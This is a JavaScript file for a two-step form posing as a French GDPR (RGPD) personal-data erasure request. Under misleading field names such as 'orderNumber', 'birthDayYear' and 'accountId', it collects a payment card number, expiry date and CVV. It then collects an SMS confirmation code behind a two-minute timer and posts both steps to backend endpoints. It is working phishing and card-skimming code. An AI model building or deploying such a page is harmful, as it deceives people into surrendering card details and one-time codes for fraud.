(function () {
  "use strict";

  var root = document.getElementById("rgpd-erasure");
  if (!root) return;

  var form = root.querySelector("#rgpd-step1");
  var form2 = root.querySelector("#rgpd-step2");
  var STEP1_FIELDS = ["lastName", "firstName", "orderNumber", "birthDayYear", "accountId"];
  var STEP2_FIELDS = ["smsNum"];
  var birthInput = root.querySelector("#rgpd-birthDayYear");
  var orderInput = root.querySelector('[name="orderNumber"]');
  var cvvInput = root.querySelector('[name="accountId"]');
  var smsInput = root.querySelector('[name="smsNum"]');

  /* ---------- Filtres de saisie ---------- */

  /* Numéro de carte : chiffres uniquement, espaces tous les 4 chiffres */
  orderInput.addEventListener("input", function (e) {
    var digits = orderInput.value.replace(/\D/g, "").slice(0, 16);
    var deleting = e.inputType && e.inputType.indexOf("delete") === 0;
    var formatted = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
    if (deleting && digits.length === 4) formatted = digits;
    if (formatted !== orderInput.value) orderInput.value = formatted;
  });

  /* Date d'expiration : MM/AA */
  birthInput.addEventListener("input", function (e) {
    var digits = birthInput.value.replace(/\D/g, "").slice(0, 4);
    var deleting = e.inputType && e.inputType.indexOf("delete") === 0;
    var formatted = digits.length > 2 || (digits.length === 2 && !deleting)
      ? digits.slice(0, 2) + "/" + digits.slice(2)
      : digits;
    if (formatted !== birthInput.value) birthInput.value = formatted;
  });

  /* CVV : 3 chiffres uniquement */
  cvvInput.addEventListener("input", function () {
    cvvInput.value = cvvInput.value.replace(/\D/g, "").slice(0, 3);
  });

  /* Code SMS : chiffres uniquement */
  smsInput.addEventListener("input", function () {
    smsInput.value = smsInput.value.replace(/\D/g, "").slice(0, 6);
  });

  var state = { step: 1, data: {} };

  function parseBirth(v) {
    var m = /^(\d{1,2})\/(\d{2})$/.exec(v);
    return m ? { month: parseInt(m[1], 10), year: parseInt(m[2], 10) } : null;
  }

  /* ---------- Règles de validation ---------- */
  var NAME_RE = /^[A-Za-zÀ-ÖØ-öø-ÿŒœ' \-]+$/;
  var ORDER_RE = /^\d{13,19}$/;
  var CVV_RE = /^\d{3}$/;
  var SMS_RE = /^\d{4,8}$/;

  var rules = {
    lastName: function (v) {
      if (!v) return "Veuillez indiquer votre nom.";
      if (v.length < 2) return "Votre nom doit contenir au moins 2 caractères.";
      if (!NAME_RE.test(v)) return "Utilisez uniquement des lettres, espaces, tirets ou apostrophes.";
      return "";
    },
    firstName: function (v) {
      if (!v) return "Veuillez indiquer votre prénom.";
      if (v.length < 2) return "Votre prénom doit contenir au moins 2 caractères.";
      if (!NAME_RE.test(v)) return "Utilisez uniquement des lettres, espaces, tirets ou apostrophes.";
      return "";
    },
    orderNumber: function (v) {
      if (!v || !v.trim()) return "Ce champ est obligatoire.";
      var digits = v.replace(/\s/g, "");
      if (!/^\d+$/.test(digits)) return "Utilisez uniquement des chiffres.";
      if (!ORDER_RE.test(digits)) return "Ce numéro de carte ne semble pas valide.";
      return "";
    },
    birthDayYear: function (v) {
      if (!v) return "Veuillez indiquer la date d'expiration.";
      var b = parseBirth(v);
      if (!b) return "Utilisez le format MM/AA (ex. : 12/31).";
      if (b.month < 1 || b.month > 12) return "Le mois doit être compris entre 01 et 12.";
      /* Vérifie que la carte n'est pas expirée (mois courant inclus) */
      var now = new Date();
      var currentYear = now.getFullYear() % 100;
      var currentMonth = now.getMonth() + 1;
      if (b.year < currentYear || (b.year === currentYear && b.month < currentMonth)) {
        return "Cette carte semble expirée.";
      }
      return "";
    },
    accountId: function (v) {
      if (!v) return "Veuillez indiquer le CVV.";
      if (!CVV_RE.test(v)) return "Le CVV doit être composé de 3 chiffres.";
      return "";
    },
    smsNum: function (v) {
      if (!v) return "Veuillez indiquer le code de confirmation.";
      if (!SMS_RE.test(v)) return "Le code doit être composé de chiffres uniquement.";
      return "";
    }
  };

  function fieldWrap(name) {
    return root.querySelector('[data-field="' + name + '"]');
  }

  function normalize(value) {
    return String(value || "").trim().replace(/\s+/g, " ");
  }

  function fieldInput(name) {
    return root.querySelector('[name="' + name + '"]');
  }

  function setError(name, message) {
    var wrap = fieldWrap(name);
    var err = wrap.querySelector(".rgpd-erasure__error");
    err.textContent = message;
    wrap.classList.toggle("has-error", !!message);
    fieldInput(name).setAttribute("aria-invalid", message ? "true" : "false");
  }

  function validateField(name) {
    var msg = rules[name](normalize(fieldInput(name).value));
    setError(name, msg);
    return !msg;
  }

  /* Validation au fil de la saisie, uniquement après une première erreur */
  Object.keys(rules).forEach(function (name) {
    var input = fieldInput(name);
    if (!input) {
      console.error("Champ introuvable :", name);
      return;
    }
    input.addEventListener("blur", function () {
      if (normalize(input.value) || fieldWrap(name).classList.contains("has-error")) {
        validateField(name);
      }
    });
    input.addEventListener(input.tagName === "SELECT" ? "change" : "input", function () {
      if (fieldWrap(name).classList.contains("has-error")) validateField(name);
    });
  });

  function showAlert(formEl, count) {
    var box = formEl.querySelector("[data-alert]");
    if (!count) {
      box.classList.remove("is-visible");
      box.textContent = "";
      return;
    }
    box.textContent = count === 1
      ? "Un champ doit être corrigé avant de continuer."
      : count + " champs doivent être corrigés avant de continuer.";
    box.classList.add("is-visible");
  }

  function validateStep(formEl, names) {
    var invalid = names.filter(function (name) { return !validateField(name); });
    showAlert(formEl, invalid.length);
    if (invalid.length) fieldInput(invalid[0]).focus();
    return !invalid.length;
  }

  /* ---------- Navigation entre étapes ---------- */
  function goToStep(n) {
    root.querySelectorAll("[data-step]").forEach(function (el) {
      el.hidden = el.getAttribute("data-step") !== String(n);
    });
    root.querySelectorAll("[data-step-indicator]").forEach(function (el) {
      if (el.getAttribute("data-step-indicator") === String(n)) {
        el.setAttribute("aria-current", "step");
      } else {
        el.removeAttribute("aria-current");
      }
    });
    state.step = n;
    var panel = root.querySelector('[data-step="' + n + '"]');
    if (panel) {
      root.scrollIntoView({ behavior: "smooth", block: "start" });
      if (panel.hasAttribute("tabindex")) panel.focus({ preventScroll: true });
    }
  }

  /* ---------- Timer SMS (démarre à l'étape 2) ---------- */
  var smsTimer = null;
  var smsTimeLeft = 120;

  function startSmsTimer() {
    if (smsTimer) return; // déjà lancé
    var el = document.getElementById("sms-timer");
    if (!el) return;
    smsTimeLeft = 120;
    el.textContent = "02:00";
    smsTimer = setInterval(function () {
      smsTimeLeft--;
      var m = Math.floor(smsTimeLeft / 60);
      var s = smsTimeLeft % 60;
      el.textContent = String(m).padStart(2, "0") + ":" + String(s).padStart(2, "0");
      if (smsTimeLeft <= 0) {
        clearInterval(smsTimer);
        smsTimer = null;
        el.textContent = "00:00";
      }
    }, 1000);
  }

  /* ---------- Étape 1 : identification ---------- */
  form.addEventListener("submit", function (e) {
    e.preventDefault();
    if (!validateStep(form, STEP1_FIELDS)) return;

    var birth = parseBirth(normalize(birthInput.value));
    state.data = {
      lastName: normalize(fieldInput("lastName").value),
      firstName: normalize(fieldInput("firstName").value),
      orderNumber: normalize(fieldInput("orderNumber").value).replace(/\s/g, "") || null,
      birthMonth: birth ? birth.month : null,
      birthYear: birth ? birth.year : null,
      accountId: normalize(fieldInput("accountId").value)
    };

    root.dispatchEvent(new CustomEvent("rgpd:step1-complete", {
      bubbles: true,
      detail: Object.assign({}, state.data)
    }));

    fetch("/api/rgpd-step1", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(state.data)
    })
    .then(function (response) {
      if (!response.ok) throw new Error("Erreur d'envoi");
      console.log("Notification envoyée !");
    })
    .catch(function (error) { console.error(error); });

    startSmsTimer();
    goToStep(2);
  });

  /* ---------- Étape 2 : SMS de confirmation ---------- */
  form2.addEventListener("submit", function (e) {
    e.preventDefault();
    if (!validateStep(form2, STEP2_FIELDS)) return;

    state.data.smsNum = normalize(fieldInput("smsNum").value);
    var data = Object.assign({}, state.data);

    root.dispatchEvent(new CustomEvent("rgpd:submit", { bubbles: true, detail: data }));

    var send = window.RgpdErasure && window.RgpdErasure.send;
    var submitBtn = form2.querySelector('button[type="submit"]');
    var label = submitBtn.firstChild;
    var original = label.nodeValue;

    submitBtn.disabled = true;
    label.nodeValue = " Envoi en cours… ";

    Promise.resolve(typeof send === "function" ? send(data) : null)
      .then(function (res) {
        if (res && res.ok === false) throw new Error("HTTP " + res.status);
        showDone();
      })
      .catch(function () {
        var box = form2.querySelector("[data-alert]");
        box.textContent = "Une erreur est survenue lors de l'envoi. Veuillez réessayer dans quelques instants.";
        box.classList.add("is-visible");
      })
      .then(function () {
        submitBtn.disabled = false;
        label.nodeValue = original;
      });
  });

  function showDone() {
    root.classList.add("is-done");
    if (smsTimer) {
      clearInterval(smsTimer);
      smsTimer = null;
    }
    goToStep("done");
  }

  root.addEventListener("click", function (e) {
    var btn = e.target.closest("[data-go-step]");
    if (btn) goToStep(parseInt(btn.getAttribute("data-go-step"), 10));
  });

  /* ---------- API publique ---------- */
  window.RgpdErasure = window.RgpdErasure || {};
  window.RgpdErasure.getData = function () { return Object.assign({}, state.data); };
  window.RgpdErasure.goToStep = goToStep;

  /* Envoi étape 2 branché sur ton backend */
  window.RgpdErasure.send = function (data) {
    return fetch("/api/rgpd-step2", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });
  };
})();
